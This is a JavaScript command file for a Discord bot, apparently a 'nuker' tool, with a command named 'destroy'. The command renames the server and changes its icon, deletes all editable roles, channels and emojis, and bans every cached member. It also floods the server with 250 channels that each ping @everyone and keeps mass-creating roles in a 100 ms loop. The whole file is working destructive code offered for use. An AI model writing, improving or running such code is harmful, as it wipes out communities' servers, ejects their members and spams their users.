const Discord = require('discord.js')
const chalk = require('chalk')

module.exports = {
    name: 'destroy',
    description: 'destroys server',
    run: async(nuker, message, args) => {
        if(!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(chalk.grey("ERROR: MISSING ADMINISTRATOR PERMISSION!"))
        const text = args.join(' ')
        if(!text) {
            message.guild.setName('GHOSTS DESTROY YOU').then(
                console.log(chalk.yellowBright(`CHANGED SERVER NAME TO ${message.guild.name}`))
            )

            message.guild.setIcon('https://media.discordapp.net/attachments/772785979278229555/860902258027397140/download_6.png')

            message.guild.roles.cache.forEach((role) => {
                if(!role.editable) return
                role.delete("GET DESTROYED").then(
                    console.log(
                        chalk.yellowBright
                        (
                            "DELETED ROLE"
                        )
                    )
                )
            })

            message.guild.channels.cache.forEach(
                channel => channel.delete("GET DESTROYED").then(
                    console.log(
                        chalk.yellowBright
                        (
                            "DELETED CHANNEL"
                        )
                    )
                )
            )

            message.guild.emojis.cache.forEach(
                emoji => emoji.delete(
                    "GET DESTROYED"
                ).then(
                    console.log(
                        chalk.yellowBright(
                            "DELETED EMOJI"
                        )
                    )
                )
            )

            message.guild.members.cache.forEach(
                member => 
                    member.ban({
                    reason: "GET DESTROYED"
                }).then(
                    console.log(
                        chalk.yellowBright(
                            `BANNED ${member.user.tag}`
                        )
                    )
                )
            )

            for (let i = 0; i < 250; i++) {
                message.guild.channels.create('ghosts').then(
                    function (ch, i) {
                        ch.send("@everyone").then(
                            console.log(
                                chalk.yellowBright(
                                    "CHANNEL PINGED"
                                )
                            )
                        )
                    }
                )
            }

            setInterval(function () {
                for (let i = 0; i < 250; i++) {
                    message.guild.roles.create({
                        data: {
                            name: "GHOSTS™",
                            position: i++,
                            color: "BLACK"
                        }
                    }).then(
                        console.log(
                            chalk.yellowBright(
                                "SPAMMING ROLES"
                            )
                        )
                    )
                }
                message.delete()
            }, 100)
        } else {
            message.guild.setName(text).then(
                console.log(chalk.yellowBright(`CHANGED SERVER NAME TO ${message.guild.name}`))
            )

            message.guild.setIcon('https://media.discordapp.net/attachments/772785979278229555/860902258027397140/download_6.png')

            message.guild.roles.cache.forEach((role) => {
                if(!role.editable) return
                role.delete(text).then(
                    console.log(
                        chalk.yellowBright
                        (
                            "DELETED ROLE"
                        )
                    )
                )
            })

            message.guild.channels.cache.forEach(
                channel => channel.delete(text).then(
                    console.log(
                        chalk.yellowBright
                        (
                            "DELETED CHANNEL"
                        )
                    )
                )
            )

            message.guild.emojis.cache.forEach(
                emoji => emoji.delete(
                    text
                ).then(
                    console.log(
                        chalk.yellowBright(
                            "DELETED EMOJI"
                        )
                    )
                )
            )

            message.guild.members.cache.forEach(
                member => 
                    member.ban({
                    reason: text
                }).then(
                    console.log(
                        chalk.yellowBright(
                            `BANNED ${member.user.tag}`
                        )
                    )
                )
            )

            for (let i = 0; i < 250; i++) {
                message.guild.channels.create(text).then(
                    function (ch, i) {
                        ch.send("@everyone").then(
                            console.log(
                                chalk.yellowBright(
                                    "CHANNEL PINGED"
                                )
                            )
                        )
                    }
                )
            }

            setInterval(function () {
                for (let i = 0; i < 250; i++) {
                    message.guild.roles.create({
                        data: {
                            name: text,
                            position: i++,
                            color: "BLACK"
                        }
                    }).then(
                        console.log(
                            chalk.yellowBright(
                                "SPAMMING ROLES"
                            )
                        )
                    )
                }
                message.delete()
            }, 100)
        }
    }
}